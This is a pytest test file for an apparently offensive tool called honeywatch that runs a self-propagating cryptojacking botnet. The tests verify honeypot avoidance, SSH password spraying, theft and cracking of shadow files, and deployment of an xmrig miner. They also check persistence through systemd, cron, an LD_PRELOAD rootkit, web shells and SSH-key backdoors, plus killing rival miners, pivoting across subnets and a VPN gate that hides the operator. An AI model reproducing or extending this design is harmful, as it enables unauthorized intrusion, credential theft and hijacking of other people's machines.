"""Tests for the autonomous chain orchestrator.

Network is never touched: phases that hit the wire are overridden on a
subclass so the loop logic, state threading, and the pivot subnet parser are
exercised deterministically.
"""

from __future__ import annotations

import asyncio

import pytest

from honeywatch.chain import (
    ChainConfig,
    ChainOrchestrator,
    ChainPhase,
    ChainState,
    _adjacent_subnets,
)
from honeywatch.hashcrack import CrackedHash, HashCrackResult
from honeywatch.opsec import AuthMethods
from honeywatch.spray import SprayResult


def test_adjacent_subnets_parses_ip_o_addr():
    out = (
        "1: lo    inet 127.0.0.1/8 scope host lo\n"
        "2: eth0    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0\n"
        "3: eth1    inet 192.168.1.20/24 brd 192.168.1.255 scope global eth1\n"
        "4: docker0    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n"
    )
    nets = _adjacent_subnets(out)
    # loopback skipped, RFC1918 kept. Finding #8: the actual CIDR is now
    # read from the output instead of forcing /24. The /16 docker interface
    # is capped at /20 (4096 hosts — large enough for a pivot, small enough
    # to finish in a reasonable scan).
    assert nets == ["10.0.0.0/24", "192.168.1.0/24", "172.17.0.0/20"]


def test_adjacent_subnets_skips_loopback_and_linklocal():
    out = (
        "1: lo    inet 127.0.0.1/8 scope host lo\n"
        "2: eth0    inet 169.254.1.5/24 scope global eth0\n"
    )
    assert _adjacent_subnets(out) == []


def test_adjacent_subnets_preserves_actual_cidr():
    """Finding #8: the actual CIDR from ip -o -4 addr is used, not forced /24.
    A /30 stays a /30 (4 hosts); a /16 is capped at /20."""
    out = "2: eth0    inet 10.5.5.7/30 brd 10.5.5.7 scope global eth0\n"
    assert _adjacent_subnets(out) == ["10.5.5.4/30"]
    # A /8 would be too loud — capped at /20.
    out2 = "2: eth0    inet 10.0.0.5/8 brd 10.255.255.255 scope global eth0\n"
    assert _adjacent_subnets(out2) == ["10.0.0.0/20"]


class _MockChain(ChainOrchestrator):
    """Orchestrator whose phases don't touch the network.

    Simulates a two-round growth loop: round 1 pivots to a new subnet, round 2
    finds nothing new and the chain stops on growth-exhausted.
    """

    def __init__(self, config):
        super().__init__(config)
        self._round_hosts = {1: [("10.0.0.5", 22)], 2: []}

    async def phase_recon(self):
        self._emit(ChainPhase.RECON, "mock recon")
        # pretend recon discovered these hosts and wrote them to the store.

    async def phase_enumerate(self):
        hosts = self._round_hosts.get(self.state.round, [])
        self.state.hosts = hosts
        self.state.sprayable = hosts
        self._emit(ChainPhase.ENUMERATE, f"{len(hosts)} hosts")

    async def phase_spray(self):
        seen = {(c["ip"], c["port"], c["user"], c["password"]) for c in self.state.credentials}
        for ip, port in self.state.sprayable:
            key = (ip, port, "root", "pw")
            if key not in seen:
                self.state.credentials.append({"ip": ip, "port": port,
                                                "user": "root", "password": "pw"})
                seen.add(key)
        self._emit(ChainPhase.SPRAY, f"{len(self.state.credentials)} creds")

    async def phase_foothold(self):
        existing = {(f[0], f[1], f[2]) for f in self.state.footholds}
        for c in self.state.credentials:
            key = (c["ip"], c["port"], c["user"])
            if key not in existing:
                self.state.footholds.append((c["ip"], c["port"], c["user"], c["password"]))
                existing.add(key)
        self._emit(ChainPhase.FOOTHOLD, f"{len(self.state.footholds)} footholds")

    async def phase_escalate(self):
        self._emit(ChainPhase.ESCALATE, "mock escalate")

    async def phase_persist(self):
        self.state.enqueued = [(f[0], f[1]) for f in self.state.footholds]
        self._emit(ChainPhase.PERSIST, f"{len(self.state.enqueued)} enqueued")

    async def phase_pivot(self):
        # Round 1 discovers a new subnet; round 2 discovers nothing -> stops.
        if self.state.round == 1:
            self.cfg.targets = ["10.0.1.0/24"]
            self._emit(ChainPhase.PIVOT, "found 10.0.1.0/24")
        else:
            self.cfg.targets = []
            self._emit(ChainPhase.PIVOT, "no new subnets")


def test_chain_loops_then_stops_on_growth_exhausted():
    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=3, pool="p", wallet="w",
                      skip_vpn_check=True)
    orch = _MockChain(cfg)
    state = orch.run()
    # Two rounds ran (round 1 pivoted, round 2 exhausted growth).
    assert state.round == 2
    assert state.stopped is True
    assert "growth exhausted" in state.stop_reason
    assert len(state.credentials) == 1
    assert len(state.footholds) == 1
    assert len(state.enqueued) == 1
    # Each phase was logged in both rounds.
    phases_seen = {e["phase"] for e in state.log}
    for p in ("recon", "enumerate", "spray", "foothold", "escalate", "loot",
              "persist", "pivot"):
        assert p in phases_seen


def test_chain_state_note_records_round():
    s = ChainState()
    s.round = 1
    s.note(ChainPhase.RECON, "hi", extra="x")
    assert s.log[0] == {"phase": "recon", "msg": "hi", "round": 1, "extra": "x"}


def test_chain_max_rounds_zero_runs_forever_until_growth_exhausted():
    """max_rounds=0 is the daemon mode: it must loop until a pivot round finds
    no new subnets, NOT stop at a fixed round count."""
    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=0, pool="p", wallet="w",
                      skip_vpn_check=True)
    orch = _MockChain(cfg)
    state = orch.run()
    # round 1 pivots to 10.0.1.0/24, round 2 finds nothing -> growth-exhausted.
    assert state.round == 2
    assert state.stopped is True
    assert "growth exhausted" in state.stop_reason
    # it must NOT claim it hit a max-rounds cap (there is no cap when 0=forever).
    assert "max_rounds" not in state.stop_reason


def test_chain_max_rounds_one_caps_cleanly():
    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=1, pool="p", wallet="w",
                      skip_vpn_check=True)
    orch = _MockChain(cfg)
    state = orch.run()
    # one round runs, it pivots to new ground, but the cap stops it before round 2.
    assert state.round == 1
    assert state.stopped is True
    assert state.stop_reason == "reached max_rounds=1"



def test_chain_config_defaults():
    cfg = ChainConfig()
    assert cfg.payload_id == "xmrig"
    assert cfg.max_rounds == 3
    assert cfg.target_labels == {"real", "likely_real"}
    # exec_mode was removed: the chain only enqueues; the worker owns exec mode.
    assert not hasattr(cfg, "exec_mode")
    # wordlist was removed: no crack-fallback phase exists; escalate uses
    # hashcrack_wordlist instead.
    assert not hasattr(cfg, "wordlist")


# --------------------------------------------------------------------------- #
# Real phase-method tests (network deps monkeypatched).
# These exercise the actual phase_* bodies -- not the _MockChain overrides --
# so the store side-effects, state threading, and the A1-A4 / B1-B3 fixes are
# covered.
# --------------------------------------------------------------------------- #


class _FakeStore:
    """In-memory stand-in for Store; only the methods the chain calls."""

    def __init__(self, query_rows=None, creds=None):
        self._rows = query_rows or []
        self._creds = creds or []
        self.upserted = False

    def query(self, limit=100, label=None, min_confidence=0.0, labels=None):
        rows = [r for r in self._rows if r.get("confidence", 0) >= min_confidence]
        if labels is not None:
            rows = [r for r in rows if r.get("label") in labels]
        elif label is not None:
            rows = [r for r in rows if r.get("label") == label]
        return rows[:limit]

    def query_credentials(self, ip=None, port=None, user=None, limit=1000):
        out = list(self._creds)
        if ip is not None:
            out = [c for c in out if c["ip"] == ip]
        return out[:limit]

    def upsert_credential(self, ip, port, user, password, banner=None,
                          attempts=0, source="crack"):
        self.upserted = True
        self._creds.append({"ip": ip, "port": port, "user": user,
                            "password": password, "source": source})


class _FakeManifest:
    pass


class _FakeOp:
    id = "op-test-1"


def _run(coro):
    """Drive an async phase method in a test (no running loop)."""
    return asyncio.run(coro)


class _FakeScore:
    final_label = "real"


def test_phase_enumerate_filters_labels_and_prechecks(monkeypatch):
    cfg = ChainConfig(targets=["10.0.0.0/24"], min_confidence=0.7)
    orch = ChainOrchestrator(cfg)
    fake = _FakeStore(query_rows=[
        {"ip": "10.0.0.1", "port": 22, "label": "real", "confidence": 0.9},
        {"ip": "10.0.0.2", "port": 22, "label": "honeypot", "confidence": 0.95},
        {"ip": "10.0.0.3", "port": 22, "label": "likely_real", "confidence": 0.75},
    ])
    monkeypatch.setattr(orch, "_store", lambda: fake)

    def fake_auth(ip, port, user, timeout_s=6.0):
        am = AuthMethods(ip=ip, port=port, user=user)
        am.offers_password = ip.endswith(".1") or ip.endswith(".3")
        return am
    monkeypatch.setattr("honeywatch.opsec.auth_methods", fake_auth)

    _run(orch.phase_enumerate())
    # honeypot-label row filtered out by target_labels; real + likely_real kept
    assert ("10.0.0.1", 22) in orch.state.hosts
    assert ("10.0.0.3", 22) in orch.state.hosts
    assert ("10.0.0.2", 22) not in orch.state.hosts
    # only the two that offer password auth are sprayable
    assert orch.state.sprayable == [("10.0.0.1", 22), ("10.0.0.3", 22)]


def test_phase_spray_persists_and_accumulates(monkeypatch):
    cfg = ChainConfig(users=["admin"], passwords=["pw1"])
    orch = ChainOrchestrator(cfg)
    orch.state.sprayable = [("10.0.0.1", 22), ("10.0.0.2", 22)]
    fake = _FakeStore()
    monkeypatch.setattr(orch, "_store", lambda: fake)

    sprayed = []
    async def fake_spray(plan, pool=None, host_concurrency=8, **kw):
        sprayed.append(plan.password)
        return [SprayResult(ip=h.ip, port=h.port,
                            success=(plan.password == "pw1" and h.ip == "10.0.0.1"),
                            user="admin", password=plan.password, attempts=1)
                for h in plan.hosts]
    monkeypatch.setattr("honeywatch.spray.spray_plan", fake_spray)

    orch.state.round = 1
    _run(orch.phase_spray())
    assert sprayed == ["pw1"]
    assert len(orch.state.credentials) == 1
    assert orch.state.credentials[0]["ip"] == "10.0.0.1"
    assert fake.upserted is True


def test_phase_spray_reuse_creds_prepends_recovered_round2(monkeypatch):
    cfg = ChainConfig(users=["admin"], passwords=["newpw"])
    orch = ChainOrchestrator(cfg)
    orch.state.sprayable = [("10.0.0.5", 22)]
    fake = _FakeStore(creds=[{"ip": "10.0.0.1", "port": 22,
                              "user": "root", "password": "oldpw"}])
    monkeypatch.setattr(orch, "_store", lambda: fake)

    sprayed = []
    async def fake_spray(plan, **kw):
        sprayed.append(plan.password)
        return []
    monkeypatch.setattr("honeywatch.spray.spray_plan", fake_spray)

    orch.state.round = 2
    _run(orch.phase_spray())
    # recovered "oldpw" is prepended (fleet growth), then configured "newpw"
    assert sprayed[0] == "oldpw"
    assert "newpw" in sprayed


def test_phase_foothold_skips_already_confirmed(monkeypatch):
    cfg = ChainConfig()
    orch = ChainOrchestrator(cfg)
    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]  # already confirmed
    fake = _FakeStore(creds=[
        {"ip": "10.0.0.1", "port": 22, "user": "root", "password": "pw"},
        {"ip": "10.0.0.2", "port": 22, "user": "root", "password": "pw"},
    ])
    monkeypatch.setattr(orch, "_store", lambda: fake)

    grabbed = []
    def fake_grab(ip, port, user, password, stash_dir=None, **kw):
        grabbed.append(ip)
        if ip.endswith(".2"):
            return {"ip": ip, "shadow_path": f"{stash_dir}/{ip}/shadow"}
        return {"ip": ip, "error": "nope"}
    monkeypatch.setattr("honeywatch.hashcrack.grab_shadow", fake_grab)

    _run(orch.phase_foothold())
    # already-confirmed .1 is never re-grabbed (no target-side noise)
    assert "10.0.0.1" not in grabbed
    assert "10.0.0.2" in grabbed
    assert ("10.0.0.2", 22, "root", "pw") in orch.state.footholds
    assert ("10.0.0.1", 22, "root", "pw") in orch.state.footholds


def test_phase_escalate_appends_cracked_to_state(monkeypatch, tmp_path):
    stash = tmp_path / "shadow_stash"
    cfg = ChainConfig(hashcrack_wordlist=str(tmp_path / "wl"))
    cfg.shadow_stash = str(stash)
    orch = ChainOrchestrator(cfg)
    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]
    orch.state.credentials = [{"ip": "10.0.0.1", "port": 22,
                               "user": "root", "password": "pw"}]
    fake = _FakeStore()
    monkeypatch.setattr(orch, "_store", lambda: fake)

    host_stash = stash / "10.0.0.1"
    host_stash.mkdir(parents=True)
    (host_stash / "shadow").write_text("x")

    def fake_crack(path, wl, tool="hashcat"):
        r = HashCrackResult(tool=tool)
        r.cracked = [CrackedHash(user="bob", hash="h", password="bobpw", success=True)]
        return r
    monkeypatch.setattr("honeywatch.hashcrack.crack_shadow", fake_crack)

    _run(orch.phase_escalate())
    # A1: offline-cracked creds now land in state.credentials, not just the store
    assert any(c["user"] == "bob" for c in orch.state.credentials)
    assert len(orch.state.credentials) == 2  # original root + cracked bob
    assert fake.upserted is True


def test_phase_persist_enqueues_and_tracks(monkeypatch):
    cfg = ChainConfig(payload_id="xmrig", pool="p", wallet="w")
    orch = ChainOrchestrator(cfg)
    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]
    fake = _FakeStore()
    monkeypatch.setattr(orch, "_store", lambda: fake)
    monkeypatch.setattr("honeywatch.ops.build_manifest",
                        lambda pid, targets, variables, apply_evasion=None,
                               allow_unsafe_vars=False: _FakeManifest())
    monkeypatch.setattr("honeywatch.ops.enqueue_operation",
                        lambda c2, manifest: _FakeOp())
    monkeypatch.setattr("honeywatch.c2.store.C2Store", lambda db_path: object())

    _run(orch.phase_persist())
    # A4: tracks enqueued targets, not a fictional "deployed" fleet
    assert orch.state.enqueued == [("10.0.0.1", 22)]
    assert not hasattr(orch.state, "deployed")


def test_phase_persist_aborts_without_pool_for_miner(monkeypatch):
    cfg = ChainConfig(payload_id="xmrig", pool="", wallet="")
    orch = ChainOrchestrator(cfg)
    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]
    monkeypatch.setattr(orch, "_store", lambda: _FakeStore())

    _run(orch.phase_persist())
    assert orch.state.enqueued == []
    assert any(e["phase"] == "persist" and "ABORT" in e["msg"]
               for e in orch.state.log)


# --------------------------------------------------------------------------- #
# Phase 8: Per-foothold persistence selection
# --------------------------------------------------------------------------- #


class TestPersistenceProfile:
    def _make_orch(self, **kw):
        cfg = ChainConfig(payload_id="xmrig", pool="p", wallet="w", **kw)
        return ChainOrchestrator(cfg)

    def test_root_linux_profile(self):
        orch = self._make_orch()
        profile = orch._persistence_profile("10.0.0.1", 22, "root")
        assert "linux" in profile
        assert "root" in profile

    def test_normal_linux_profile(self):
        orch = self._make_orch()
        profile = orch._persistence_profile("10.0.0.1", 22, "ubuntu")
        assert "normal" in profile

    def test_container_profile_from_loot(self):
        orch = self._make_orch()
        orch.state.loot = [{"ip": "10.0.0.1", "metadata": {"docker_socket_present": "true"}}]
        profile = orch._persistence_profile("10.0.0.1", 22, "root")
        assert "container" in profile

    def test_container_profile_from_dockerenv(self):
        orch = self._make_orch()
        orch.state.loot = [{"ip": "10.0.0.1", "raw": ".dockerenv found"}]
        profile = orch._persistence_profile("10.0.0.1", 22, "root")
        assert "container" in profile

    def test_web_profile_from_loot(self):
        orch = self._make_orch()
        orch.state.loot = [{"ip": "10.0.0.1", "services": "80/tcp open http"}]
        profile = orch._persistence_profile("10.0.0.1", 22, "root")
        assert "web" in profile

    def test_windows_profile(self):
        orch = self._make_orch()
        orch.state.loot = [{"ip": "10.0.0.1", "raw": "cmd.exe found"}]
        profile = orch._persistence_profile("10.0.0.1", 22, "admin")
        assert profile == "windows"


class TestEvasionChainForProfile:
    def _make_orch(self, **kw):
        cfg = ChainConfig(payload_id="xmrig", pool="p", wallet="w", **kw)
        return ChainOrchestrator(cfg)

    def test_root_linux_gets_systemd_cron_ldpreload(self):
        orch = self._make_orch()
        chain = orch._evasion_chain_for_profile("linux_root")
        assert "kill_miners" in chain
        assert "systemd_persist" in chain
        assert "cron_persist" in chain
        assert "ld_preload_rootkit" in chain
        assert "cleanup" in chain
        # cleanup is last
        assert chain[-1] == "cleanup"

    def test_container_skips_systemd(self):
        orch = self._make_orch()
        chain = orch._evasion_chain_for_profile("linux_container")
        assert "systemd_persist" not in chain
        assert "cron_persist" in chain  # cron is the fallback

    def test_container_with_web_gets_webshell(self):
        orch = self._make_orch()
        chain = orch._evasion_chain_for_profile("linux_container_web")
        assert "web_shell_persist" in chain

    def test_normal_linux_gets_systemd_cron(self):
        orch = self._make_orch()
        chain = orch._evasion_chain_for_profile("linux_normal")
        assert "systemd_persist" in chain
        assert "cron_persist" in chain
        assert "ld_preload_rootkit" not in chain  # needs root

    def test_windows_gets_scheduled_task(self):
        orch = self._make_orch()
        chain = orch._evasion_chain_for_profile("windows")
        assert "scheduled_task_persist" in chain
        assert "systemd_persist" not in chain
        assert "cron_persist" not in chain

    def test_root_with_web_gets_webshell(self):
        orch = self._make_orch()
        chain = orch._evasion_chain_for_profile("linux_root_web")
        assert "web_shell_persist" in chain
        assert "ld_preload_rootkit" in chain

    def test_backdoor_key_adds_sshkey(self):
        orch = self._make_orch(backdoor_key="ssh-rsa AAAA...")
        chain = orch._evasion_chain_for_profile("linux_root")
        assert "sshkey_backdoor" in chain

    def test_no_backdoor_key_skips_sshkey(self):
        orch = self._make_orch()
        chain = orch._evasion_chain_for_profile("linux_root")
        assert "sshkey_backdoor" not in chain

    def test_kill_miners_always_first(self):
        orch = self._make_orch()
        for profile in ["linux_root", "linux_normal", "linux_container", "windows"]:
            chain = orch._evasion_chain_for_profile(profile)
            assert chain[0] == "kill_miners"

    def test_cleanup_always_last(self):
        orch = self._make_orch()
        for profile in ["linux_root", "linux_normal", "linux_container", "windows"]:
            chain = orch._evasion_chain_for_profile(profile)
            assert chain[-1] == "cleanup"


def test_phase_pivot_accumulates_subnets(monkeypatch):
    cfg = ChainConfig()
    orch = ChainOrchestrator(cfg)
    orch.state.footholds = [("10.0.0.5", 22, "root", "pw")]

    def fake_ssh(ip, port, user, pw, key, command, timeout_s=15.0):
        return (0, "2: eth0    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0\n", None)
    monkeypatch.setattr("honeywatch.chain._ssh_exec", fake_ssh)
    _run(orch.phase_pivot())
    assert orch.state.pivoted_subnets == ["10.0.0.0/24"]
    assert orch.cfg.targets == ["10.0.0.0/24"]

    # second pivot from a different foothold accumulates (A2), not resets
    orch.state.footholds = [("192.168.1.20", 22, "root", "pw")]
    monkeypatch.setattr("honeywatch.chain._ssh_exec",
                        lambda ip, port, user, pw, key, command, timeout_s=15.0:
                        (0, "2: eth1    inet 192.168.1.20/24 brd 192.168.1.255 "
                            "scope global eth1\n", None))
    _run(orch.phase_pivot())
    assert orch.state.pivoted_subnets == ["10.0.0.0/24", "192.168.1.0/24"]


def test_phase_pivot_dedups_already_pivoted_subnets(monkeypatch):
    cfg = ChainConfig()
    orch = ChainOrchestrator(cfg)
    orch.state.footholds = [("10.0.0.5", 22, "root", "pw")]
    orch.state.pivoted_subnets = ["10.0.0.0/24"]  # already pivoted once
    monkeypatch.setattr("honeywatch.chain._ssh_exec",
                        lambda ip, port, user, pw, key, command, timeout_s=15.0:
                        (0, "2: eth0    inet 10.0.0.5/24 scope global eth0\n", None))
    _run(orch.phase_pivot())
    # the already-known subnet is not re-queued for recon
    assert orch.cfg.targets == []
    assert orch.state.pivoted_subnets == ["10.0.0.0/24"]


def test_phase_recon_runs_pipeline_scan(monkeypatch):
    cfg = ChainConfig(targets=["10.0.0.0/24"])
    orch = ChainOrchestrator(cfg)
    monkeypatch.setattr(orch, "_store", lambda: _FakeStore())

    class FakePipe:
        async def scan(self, targets, tool="masscan", ports=None, rate=None,
                       max_hosts=None, skip_vpn_check=False, resume=False,
                       progress=False):
            return [_FakeScore(), _FakeScore()]
    monkeypatch.setattr("honeywatch.pipeline.Pipeline",
                        lambda cfg, store=None: FakePipe())
    monkeypatch.setattr("honeywatch.config.load_config", lambda x: object())

    _run(orch.phase_recon())
    assert any(e["phase"] == "recon" and "scored 2" in e["msg"]
               for e in orch.state.log)


def test_phase_recon_threads_operator_config_path(monkeypatch):
    """C4: recon must load_config(cfg.config_path), not hard-coded None, so the
    operator's config.toml scan tuning is honored through the chain."""
    cfg = ChainConfig(targets=["10.0.0.0/24"], config_path="/etc/honeywatch/prod.toml")
    orch = ChainOrchestrator(cfg)
    monkeypatch.setattr(orch, "_store", lambda: _FakeStore())

    loaded = []
    class FakePipe:
        async def scan(self, *a, **kw):
            return []
    monkeypatch.setattr("honeywatch.pipeline.Pipeline", lambda c, store=None: FakePipe())
    monkeypatch.setattr("honeywatch.config.load_config",
                        lambda path: loaded.append(path) or object())

    _run(orch.phase_recon())
    assert loaded == ["/etc/honeywatch/prod.toml"]


def test_chain_round_banner_is_logged_under_round_not_recon():
    """C5: the `=== round N ===` delimiter must not be filed under the recon
    phase, so log filtering by phase stays clean."""
    cfg = ChainConfig(targets=[], max_rounds=1, skip_vpn_check=True)
    orch = ChainOrchestrator(cfg)
    # Force an immediate stop: no targets -> recon no-ops, pivot no-ops, loop
    # exits on growth-exhausted after one round.
    state = orch.run()
    round_entries = [e for e in state.log if e.get("phase") == "round"]
    assert any("=== round 1 ===" in e["msg"] for e in round_entries)
    # no recon-phase entry carries the round delimiter
    assert not any(e.get("phase") == "recon" and "===" in e["msg"]
                   for e in state.log)


# --------------------------------------------------------------------------- #
# N1: botnet VPN gate — the chain must refuse to run without Mullvad unless
# skip_vpn_check is set. Without this, a botnet run exfiltrates from the
# operator's real IP (spray, foothold, loot, pivot all do raw SSH/SFTP/IMDS).
# --------------------------------------------------------------------------- #


def test_chain_run_refuses_without_vpn(monkeypatch):
    """ChainOrchestrator.run() raises VpnError when Mullvad is down and
    skip_vpn_check is False — the gate covers every phase, not just recon."""
    import honeywatch.vpn as vpn_mod
    from honeywatch.vpn import VpnError

    monkeypatch.setattr(
        vpn_mod, "require_mullvad", lambda timeout=8.0, quiet=False: False
    )
    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=1, pool="p", wallet="w",
                      skip_vpn_check=False)
    orch = ChainOrchestrator(cfg)
    with pytest.raises(VpnError):
        orch.run()


def test_chain_run_passes_with_skip_vpn_check(monkeypatch):
    """skip_vpn_check=True bypasses the gate so unit tests / offline labs run."""
    import honeywatch.vpn as vpn_mod

    monkeypatch.setattr(
        vpn_mod, "require_mullvad", lambda timeout=8.0, quiet=False: False
    )
    cfg = ChainConfig(targets=[], max_rounds=1, skip_vpn_check=True)
    orch = ChainOrchestrator(cfg)
    # No raise; the chain runs one no-op round and exits on growth-exhausted.
    state = orch.run()
    assert state.round == 1


# --------------------------------------------------------------------------- #
# N3: phase_escalate must sanitize the foothold IP in the stash path, mirroring
# grab_shadow/grab_loot. A hostname containing / or .. (from known_hosts pivot)
# would otherwise traverse.
# --------------------------------------------------------------------------- #


def test_phase_escalate_sanitizes_ip_in_stash_path(monkeypatch, tmp_path):
    """phase_escalate builds the shadow stash path with the same safe_ip
    sanitization as grab_shadow/grab_loot — a foothold ip containing / or ..
    is replaced with _ instead of traversing the filesystem."""
    cfg = ChainConfig()
    cfg.db_path = str(tmp_path / "hw.db")
    cfg.shadow_stash = str(tmp_path / "stash")
    orch = ChainOrchestrator(cfg)
    # A "hostname" with path-traversal chars that phase_pivot could surface
    # from known_hosts/history.
    orch.state.footholds = [("../etc", 22, "root", "pw")]
    monkeypatch.setattr(orch, "_store", lambda: _FakeStore())

    called_paths: list[str] = []
    def fake_crack_shadow(stash, wordlist, tool="hashcat"):
        called_paths.append(stash)
        return HashCrackResult(tool=tool)
    monkeypatch.setattr("honeywatch.hashcrack.crack_shadow", fake_crack_shadow)

    _run(orch.phase_escalate())
    # The stash path must be sanitized — no raw "../etc" traversal.
    if called_paths:
        safe = called_paths[0]
        assert ".." not in safe or "_etc" in safe  # sanitized, not traversing
        assert "/_etc/shadow" in safe or "\\_etc\\shadow" in safe